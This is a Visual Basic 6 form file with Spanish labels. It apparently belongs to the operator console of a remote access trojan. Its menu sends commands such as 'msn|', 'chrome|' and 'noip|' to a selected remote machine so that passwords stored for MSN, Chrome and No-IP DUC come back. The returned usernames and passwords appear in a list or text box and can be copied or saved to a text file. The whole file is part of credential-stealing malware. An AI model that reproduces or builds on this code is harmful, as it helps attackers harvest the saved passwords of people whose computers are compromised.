VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F5E116E1-0563-11D8-AA80-000B6A0D10CB}#1.0#0"; "HookMenu.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form pass 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Passwords"
   ClientHeight    =   7065
   ClientLeft      =   150
   ClientTop       =   150
   ClientWidth     =   6570
   Icon            =   "pass.frx":0000
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7065
   ScaleWidth      =   6570
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame1 
      Height          =   6855
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   6375
      Begin MSComDlg.CommonDialog CD 
         Left            =   5040
         Top             =   1200
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.Timer Timer4 
         Interval        =   1
         Left            =   3600
         Top             =   1680
      End
      Begin VB.Timer Timer1 
         Interval        =   1
         Left            =   2160
         Top             =   1680
      End
      Begin VB.Timer Timer2 
         Interval        =   1
         Left            =   2640
         Top             =   1680
      End
      Begin VB.Timer Timer3 
         Interval        =   1
         Left            =   3120
         Top             =   1680
      End
      Begin MSComctlLib.ImageList ImageList3 
         Left            =   7560
         Top             =   720
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   1
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "pass.frx":058A
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin VB.TextBox Text1 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   6495
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   2
         Top             =   240
         Width           =   6135
      End
      Begin MSComctlLib.ImageList ImageList2 
         Left            =   1920
         Top             =   480
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   2
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "pass.frx":07D4
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "pass.frx":0D6E
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ImageList ImageList1 
         Left            =   1080
         Top             =   600
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   1
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "pass.frx":1308
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ListView ListView1 
         Height          =   6375
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Visible         =   0   'False
         Width           =   6135
         _ExtentX        =   10821
         _ExtentY        =   11245
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         Icons           =   "ImageList1"
         SmallIcons      =   "ImageList3"
         ColHdrIcons     =   "ImageList2"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Usuario"
            Object.Width           =   6174
            ImageIndex      =   1
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Contraseña"
            Object.Width           =   4410
            ImageIndex      =   2
         EndProperty
      End
   End
   Begin HookMenu.XpMenu XpMenu1 
      Left            =   0
      Top             =   0
      _ExtentX        =   900
      _ExtentY        =   900
      BmpCount        =   18
      CheckBorderColor=   7021576
      SelMenuBorder   =   7021576
      SelMenuBackColor=   14073525
      SelMenuForeColor=   0
      SelCheckBackColor=   14791828
      MenuBorderColor =   6956042
      SeparatorColor  =   -2147483632
      MenuBackColor   =   14609903
      MenuForeColor   =   0
      CheckBackColor  =   15326939
      CheckForeColor  =   16776960
      DisabledMenuBorderColor=   -2147483632
      DisabledMenuBackColor=   15660791
      DisabledMenuForeColor=   -2147483631
      MenuBarBackColor=   15790320
      MenuPopupBackColor=   16777215
      ShortCutNormalColor=   0
      ShortCutSelectColor=   0
      ArrowNormalColor=   16776960
      ArrowSelectColor=   12484864
      ShadowColor     =   0
      Bmp:1           =   "pass.frx":1552
      Mask:1          =   16777215
      Key:1           =   "#msn"
      Bmp:2           =   "pass.frx":18A4
      Mask:2          =   16777215
      Key:2           =   "#duc"
      Bmp:3           =   "pass.frx":1DF6
      Mask:3          =   16777215
      Key:3           =   "#firefox"
      Bmp:4           =   "pass.frx":2348
      Key:4           =   "#trillians"
      Bmp:5           =   "pass.frx":2770
      Mask:5          =   16184823
      Key:5           =   "#steam"
      Bmp:6           =   "pass.frx":2CC2
      Mask:6          =   16777215
      Key:6           =   "#ie"
      Bmp:7           =   "pass.frx":3214
      Key:7           =   "#opciones"
      Bmp:8           =   "pass.frx":363C
      Key:8           =   "#limpiar"
      Bmp:9           =   "pass.frx":3A64
      Mask:9          =   12216886
      Key:9           =   "#guardar"
      Bmp:10          =   "pass.frx":3DB6
      Mask:10         =   12216886
      Key:10          =   "#guardars"
      Bmp:11          =   "pass.frx":4108
      Key:11          =   "#refresh"
      Bmp:12          =   "pass.frx":4530
      Key:12          =   "#cut"
      Bmp:13          =   "pass.frx":4958
      Key:13          =   "#copy"
      Bmp:14          =   "pass.frx":4D80
      Mask:14         =   16777215
      Key:14          =   "#cleartext"
      Bmp:15          =   "pass.frx":50D2
      Mask:15         =   12216886
      Key:15          =   "#savepass"
      Bmp:16          =   "pass.frx":5424
      Key:16          =   "#main"
      Bmp:17          =   "pass.frx":584C
      Key:17          =   "#mails"
      Bmp:18          =   "pass.frx":5C74
      Mask:18         =   16777215
      Key:18          =   "#Chrome"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Menu menu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu msn 
         Caption         =   "MSN Passwords"
      End
      Begin VB.Menu duc 
         Caption         =   "DUC No-IP"
      End
      Begin VB.Menu a 
         Caption         =   "-"
      End
      Begin VB.Menu cut 
         Caption         =   "Cortar"
      End
      Begin VB.Menu copy 
         Caption         =   "Copiar"
      End
      Begin VB.Menu savepass 
         Caption         =   "Guardar Pass"
      End
      Begin VB.Menu cleartext 
         Caption         =   "Limpiar"
      End
   End
   Begin VB.Menu noip 
      Caption         =   "Noip"
      Visible         =   0   'False
      Begin VB.Menu refresh 
         Caption         =   "Refrescar"
      End
      Begin VB.Menu main 
         Caption         =   "Main"
      End
   End
End
Attribute VB_Name = "pass"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Private Sub Chrome_Click()
enviar "chrome|"
End Sub

Private Sub cleartext_Click()
Text1.Text = ""
End Sub

Private Sub copy_Click()
Clipboard.SetText Text1
End Sub

Private Sub cut_Click()
Clipboard.SetText Text1
Text1.Text = ""
End Sub

Private Sub duc_Click()
Text1.Text = ""
Text1.Visible = False
ListView1.Visible = True
End Sub



Private Sub Form_Load()
On Error Resume Next
Me.Caption = "Passwords de " & Form1.LV.SelectedItem
End Sub







Private Sub ListView1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 2 Then
PopupMenu noip
End If
End Sub





Private Sub main_Click()
ListView1.ListItems.Clear
ListView1.Visible = False
Text1.Visible = True
End Sub

Private Sub msn_Click()
enviar "msn|"
End Sub

Private Sub refresh_Click()
enviar "noip|"
End Sub

Private Sub savepass_Click()
On Error Resume Next
Clipboard.SetText Text1

Dim Linea As String
CD.DialogTitle = "Guardar Passwords!"
CD.Filter = "Archivos TXT|*.txt"
CD.ShowSave
If CD.FileName = "" Then
Exit Sub
Else
If Text1 = "" Then
MsgBox "Debe haber algún password en la lista para poder guardarlo!"
Exit Sub
End If
Open CD.FileName For Output As #1
Print #1, Clipboard.GetText
Close
End If
End Sub



Private Sub Text1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 2 Then
Text1.Enabled = False
PopupMenu menu
Text1.Enabled = True
End If
End Sub


Private Sub Form_Unload(Cancel As Integer)
Form1.Show
enviar "cleanpass|"
Unload Me
End Sub


Private Sub Timer1_Timer()
If Text1.Text = "" Then
cut.Enabled = False
Else
cut.Enabled = True
End If
End Sub

Private Sub Timer2_Timer()
If Text1.Text = "" Then
copy.Enabled = False
Else
copy.Enabled = True
End If

End Sub

Private Sub Timer3_Timer()
If Text1.Text = "" Then
cleartext.Enabled = False
Else
cleartext.Enabled = True
End If
End Sub

Private Sub Timer4_Timer()
If Text1.Text = "" Then
savepass.Enabled = False
Else
savepass.Enabled = True
End If

End Sub
